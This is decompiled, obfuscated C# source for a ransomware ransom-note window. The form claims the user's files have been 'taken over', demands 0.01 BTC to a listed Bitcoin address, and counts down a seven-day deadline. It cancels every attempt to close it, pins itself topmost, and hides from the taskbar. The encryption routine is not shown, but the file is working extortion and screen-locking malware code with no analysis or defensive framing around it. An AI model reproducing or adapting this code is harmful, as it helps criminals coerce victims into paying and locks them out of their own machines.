using System;
using System.ComponentModel;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Windows.Forms;

public class _Trinity_Obfuscator_faYZ_Trinity_Obfuscator_ : Form
{
	private static readonly IntPtr _Trinity_Obfuscator_VepU_Trinity_Obfuscator_ = new IntPtr(-1);

	private const uint _Trinity_Obfuscator_rVYB_Trinity_Obfuscator_ = 1u;

	private const uint _Trinity_Obfuscator_QTBg_Trinity_Obfuscator_ = 2u;

	private const uint _Trinity_Obfuscator_GIMq_Trinity_Obfuscator_ = 3u;

	private IContainer _Trinity_Obfuscator_cluu_Trinity_Obfuscator_ = null;

	private Label _Trinity_Obfuscator_VMYo_Trinity_Obfuscator_;

	private RichTextBox _Trinity_Obfuscator_IzRE_Trinity_Obfuscator_;

	private PictureBox _Trinity_Obfuscator_MRNK_Trinity_Obfuscator_;

	private Label _Trinity_Obfuscator_dfHT_Trinity_Obfuscator_;

	private TextBox _Trinity_Obfuscator_SKas_Trinity_Obfuscator_;

	private Label _Trinity_Obfuscator_ahMU_Trinity_Obfuscator_;

	[DllImport("user32.dll")]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool SetWindowPos(IntPtr intptr_0, IntPtr intptr_1, int int_0, int int_1, int int_2, int int_3, uint uint_0);

	public _Trinity_Obfuscator_faYZ_Trinity_Obfuscator_()
	{
		_Trinity_Obfuscator_xwxX_Trinity_Obfuscator_();
	}

	private void _Trinity_Obfuscator_weXp_Trinity_Obfuscator_(object sender, EventArgs e)
	{
		SetWindowPos(((Control)this).get_Handle(), _Trinity_Obfuscator_VepU_Trinity_Obfuscator_, 0, 0, 0, 0, 3u);
		DateTime dateTime = DateTime.Now.AddDays(7.0);
		Label trinity_Obfuscator_ahMU_Trinity_Obfuscator_ = _Trinity_Obfuscator_ahMU_Trinity_Obfuscator_;
		((Control)trinity_Obfuscator_ahMU_Trinity_Obfuscator_).set_Text(((Control)trinity_Obfuscator_ahMU_Trinity_Obfuscator_).get_Text() + " " + dateTime.ToString("D"));
	}

	private void _Trinity_Obfuscator_ZULz_Trinity_Obfuscator_(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
	}

	protected override void _Trinity_Obfuscator_UuPe_Trinity_Obfuscator_(bool disposing)
	{
		if (disposing && _Trinity_Obfuscator_cluu_Trinity_Obfuscator_ != null)
		{
			_Trinity_Obfuscator_cluu_Trinity_Obfuscator_.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void _Trinity_Obfuscator_xwxX_Trinity_Obfuscator_()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_019f: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a9: Expected O, but got Unknown
		//IL_0328: Unknown result type (might be due to invalid IL or missing references)
		//IL_0332: Expected O, but got Unknown
		//IL_0454: Unknown result type (might be due to invalid IL or missing references)
		//IL_045e: Expected O, but got Unknown
		//IL_0475: Unknown result type (might be due to invalid IL or missing references)
		//IL_04c0: Unknown result type (might be due to invalid IL or missing references)
		//IL_04ca: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(_Trinity_Obfuscator_faYZ_Trinity_Obfuscator_));
		_Trinity_Obfuscator_VMYo_Trinity_Obfuscator_ = new Label();
		_Trinity_Obfuscator_IzRE_Trinity_Obfuscator_ = new RichTextBox();
		_Trinity_Obfuscator_MRNK_Trinity_Obfuscator_ = new PictureBox();
		_Trinity_Obfuscator_dfHT_Trinity_Obfuscator_ = new Label();
		_Trinity_Obfuscator_SKas_Trinity_Obfuscator_ = new TextBox();
		_Trinity_Obfuscator_ahMU_Trinity_Obfuscator_ = new Label();
		((ISupportInitialize)_Trinity_Obfuscator_MRNK_Trinity_Obfuscator_).BeginInit();
		((Control)this).SuspendLayout();
		((Control)_Trinity_Obfuscator_VMYo_Trinity_Obfuscator_).set_AutoSize(true);
		((Control)_Trinity_Obfuscator_VMYo_Trinity_Obfuscator_).set_Font(new Font("Microsoft YaHei", 22f));
		((Control)_Trinity_Obfuscator_VMYo_Trinity_Obfuscator_).set_Location(new Point(21, 9));
		((Control)_Trinity_Obfuscator_VMYo_Trinity_Obfuscator_).set_Name("label1");
		((Control)_Trinity_Obfuscator_VMYo_Trinity_Obfuscator_).set_Size(new Size(689, 39));
		((Control)_Trinity_Obfuscator_VMYo_Trinity_Obfuscator_).set_TabIndex(0);
		((Control)_Trinity_Obfuscator_VMYo_Trinity_Obfuscator_).set_Text("UH-OH! YOUR FILES HAVE BEEN TAKEN OVER!");
		((Control)_Trinity_Obfuscator_IzRE_Trinity_Obfuscator_).set_BackColor(Color.FromArgb(25, 25, 25));
		((TextBoxBase)_Trinity_Obfuscator_IzRE_Trinity_Obfuscator_).set_BorderStyle((BorderStyle)1);
		((Control)_Trinity_Obfuscator_IzRE_Trinity_Obfuscator_).set_ForeColor(Color.Lime);
		((Control)_Trinity_Obfuscator_IzRE_Trinity_Obfuscator_).set_Location(new Point(373, 67));
		((Control)_Trinity_Obfuscator_IzRE_Trinity_Obfuscator_).set_Name("richTextBox1");
		((TextBoxBase)_Trinity_Obfuscator_IzRE_Trinity_Obfuscator_).set_ReadOnly(true);
		_Trinity_Obfuscator_IzRE_Trinity_Obfuscator_.set_ScrollBars((RichTextBoxScrollBars)18);
		((Control)_Trinity_Obfuscator_IzRE_Trinity_Obfuscator_).set_Size(new Size(349, 252));
		((Control)_Trinity_Obfuscator_IzRE_Trinity_Obfuscator_).set_TabIndex(1);
		((Control)_Trinity_Obfuscator_IzRE_Trinity_Obfuscator_).set_Text(componentResourceManager.GetString("richTextBox1.Text"));
		_Trinity_Obfuscator_MRNK_Trinity_Obfuscator_.set_Image((Image)componentResourceManager.GetObject("pictureBox1.Image"));
		((Control)_Trinity_Obfuscator_MRNK_Trinity_Obfuscator_).set_Location(new Point(28, 67));
		((Control)_Trinity_Obfuscator_MRNK_Trinity_Obfuscator_).set_Name("pictureBox1");
		((Control)_Trinity_Obfuscator_MRNK_Trinity_Obfuscator_).set_Size(new Size(305, 252));
		_Trinity_Obfuscator_MRNK_Trinity_Obfuscator_.set_SizeMode((PictureBoxSizeMode)1);
		_Trinity_Obfuscator_MRNK_Trinity_Obfuscator_.set_TabIndex(2);
		_Trinity_Obfuscator_MRNK_Trinity_Obfuscator_.set_TabStop(false);
		((Control)_Trinity_Obfuscator_dfHT_Trinity_Obfuscator_).set_AutoSize(true);
		((Control)_Trinity_Obfuscator_dfHT_Trinity_Obfuscator_).set_Location(new Point(24, 349));
		((Control)_Trinity_Obfuscator_dfHT_Trinity_Obfuscator_).set_Name("label2");
		((Control)_Trinity_Obfuscator_dfHT_Trinity_Obfuscator_).set_Size(new Size(313, 21));
		((Control)_Trinity_Obfuscator_dfHT_Trinity_Obfuscator_).set_TabIndex(3);
		((Control)_Trinity_Obfuscator_dfHT_Trinity_Obfuscator_).set_Text("Send 0.01 BTC to the following address:");
		((Control)_Trinity_Obfuscator_SKas_Trinity_Obfuscator_).set_BackColor(Color.FromArgb(25, 25, 25));
		((TextBoxBase)_Trinity_Obfuscator_SKas_Trinity_Obfuscator_).set_BorderStyle((BorderStyle)1);
		((Control)_Trinity_Obfuscator_SKas_Trinity_Obfuscator_).set_ForeColor(Color.White);
		((Control)_Trinity_Obfuscator_SKas_Trinity_Obfuscator_).set_Location(new Point(347, 349));
		((Control)_Trinity_Obfuscator_SKas_Trinity_Obfuscator_).set_Name("textBox1");
		((TextBoxBase)_Trinity_Obfuscator_SKas_Trinity_Obfuscator_).set_ReadOnly(true);
		((Control)_Trinity_Obfuscator_SKas_Trinity_Obfuscator_).set_Size(new Size(375, 29));
		((Control)_Trinity_Obfuscator_SKas_Trinity_Obfuscator_).set_TabIndex(4);
		((Control)_Trinity_Obfuscator_SKas_Trinity_Obfuscator_).set_Text("18EvsRRHhsHwNMHmNbMZwTNeeAaxCAM23a");
		((Control)_Trinity_Obfuscator_ahMU_Trinity_Obfuscator_).set_AutoSize(true);
		((Control)_Trinity_Obfuscator_ahMU_Trinity_Obfuscator_).set_Font(new Font("Microsoft YaHei", 22f));
		((Control)_Trinity_Obfuscator_ahMU_Trinity_Obfuscator_).set_Location(new Point(21, 424));
		((Control)_Trinity_Obfuscator_ahMU_Trinity_Obfuscator_).set_Name("label3");
		((Control)_Trinity_Obfuscator_ahMU_Trinity_Obfuscator_).set_Size(new Size(288, 39));
		((Control)_Trinity_Obfuscator_ahMU_Trinity_Obfuscator_).set_TabIndex(5);
		((Control)_Trinity_Obfuscator_ahMU_Trinity_Obfuscator_).set_Text("TIME EXPIRES ON: ");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(10f, 21f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.FromArgb(25, 25, 25));
		((Form)this).set_ClientSize(new Size(734, 471));
		((Form)this).set_ControlBox(false);
		((Control)this).get_Controls().Add((Control)(object)_Trinity_Obfuscator_ahMU_Trinity_Obfuscator_);
		((Control)this).get_Controls().Add((Control)(object)_Trinity_Obfuscator_SKas_Trinity_Obfuscator_);
		((Control)this).get_Controls().Add((Control)(object)_Trinity_Obfuscator_dfHT_Trinity_Obfuscator_);
		((Control)this).get_Controls().Add((Control)(object)_Trinity_Obfuscator_MRNK_Trinity_Obfuscator_);
		((Control)this).get_Controls().Add((Control)(object)_Trinity_Obfuscator_IzRE_Trinity_Obfuscator_);
		((Control)this).get_Controls().Add((Control)(object)_Trinity_Obfuscator_VMYo_Trinity_Obfuscator_);
		((Control)this).set_Cursor(Cursors.get_No());
		((Control)this).set_Font(new Font("Microsoft YaHei", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)this).set_ForeColor(Color.Lime);
		((Form)this).set_FormBorderStyle((FormBorderStyle)5);
		((Form)this).set_Margin(new Padding(5, 5, 5, 5));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("UH OH!");
		((Form)this).add_FormClosing(new FormClosingEventHandler(_Trinity_Obfuscator_ZULz_Trinity_Obfuscator_));
		((Form)this).add_Load((EventHandler)_Trinity_Obfuscator_weXp_Trinity_Obfuscator_);
		((ISupportInitialize)_Trinity_Obfuscator_MRNK_Trinity_Obfuscator_).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
